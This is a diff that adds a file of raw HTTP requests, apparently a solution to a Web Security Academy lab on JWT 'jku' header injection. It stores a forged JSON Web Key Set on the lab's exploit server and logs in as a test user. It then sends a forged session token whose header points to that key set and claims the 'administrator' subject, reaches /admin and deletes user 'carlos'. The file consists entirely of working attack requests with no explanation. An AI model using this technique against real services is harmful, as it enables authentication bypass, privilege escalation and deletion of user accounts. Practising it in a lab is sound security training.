@@ -1,0 +1,27 @@
+POST / HTTP/1.1
+Host: exploit-0aa70012049b82fcc14e529901c7000f.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+urlIsHttps=on&responseFile=%2F.well-known%2Fjwks.json&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%7B%0D%0A++++%22keys%22%3A+%5B%0D%0A++++++++%7B%0D%0A++++++++++++%22kty%22%3A+%22oct%22%2C%0D%0A++++++++++++%22kid%22%3A+%224ebd1c28-ee4e-4b4d-b22d-edc381b0ab21%22%2C%0D%0A++++++++++++%22k%22%3A+%22d-2RhDqzqZRExg2Z7h5N2pe5A3skcJiw_cPe4Rgi9VY%22%0D%0A++++++++%7D%0D%0A++++%5D%0D%0A%7D&formAction=STORE
+
+POST /login HTTP/1.1
+Host: 0a15008a0455828ac1595203003b00a7.web-security-academy.net
+Cookie: session=
+
+csrf=fnNg3ynoR35u7vj5CUsCearZxfhiar4w&username=wiener&password=peter
+
+GET /my-account HTTP/1.1
+Host: 0a15008a0455828ac1595203003b00a7.web-security-academy.net
+Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFhNzAwMTIwNDliODJmY2MxNGU1Mjk5MDFjNzAwMGYud2ViLXNlY3VyaXR5LWFjYWRlbXkubmV0Ly53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6IjRlYmQxYzI4LWVlNGUtNGI0ZC1iMjJkLWVkYzM4MWIwYWIyMSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUzODY0OTB9.h0lzrK_KGhIpRjlQr-Ig3h-_vz9pvdWzTQV-7yqeLFM
+
+GET /admin HTTP/1.1
+Host: 0a15008a0455828ac1595203003b00a7.web-security-academy.net
+Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFhNzAwMTIwNDliODJmY2MxNGU1Mjk5MDFjNzAwMGYud2ViLXNlY3VyaXR5LWFjYWRlbXkubmV0Ly53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6IjRlYmQxYzI4LWVlNGUtNGI0ZC1iMjJkLWVkYzM4MWIwYWIyMSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUzODY0OTB9.h0lzrK_KGhIpRjlQr-Ig3h-_vz9pvdWzTQV-7yqeLFM
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: 0a15008a0455828ac1595203003b00a7.web-security-academy.net
+Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFhNzAwMTIwNDliODJmY2MxNGU1Mjk5MDFjNzAwMGYud2ViLXNlY3VyaXR5LWFjYWRlbXkubmV0Ly53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6IjRlYmQxYzI4LWVlNGUtNGI0ZC1iMjJkLWVkYzM4MWIwYWIyMSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUzODY0OTB9.h0lzrK_KGhIpRjlQr-Ig3h-_vz9pvdWzTQV-7yqeLFM
+
+GET /admin HTTP/1.1
+Host: 0a15008a0455828ac1595203003b00a7.web-security-academy.net
+Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFhNzAwMTIwNDliODJmY2MxNGU1Mjk5MDFjNzAwMGYud2ViLXNlY3VyaXR5LWFjYWRlbXkubmV0Ly53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6IjRlYmQxYzI4LWVlNGUtNGI0ZC1iMjJkLWVkYzM4MWIwYWIyMSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUzODY0OTB9.h0lzrK_KGhIpRjlQr-Ig3h-_vz9pvdWzTQV-7yqeLFM
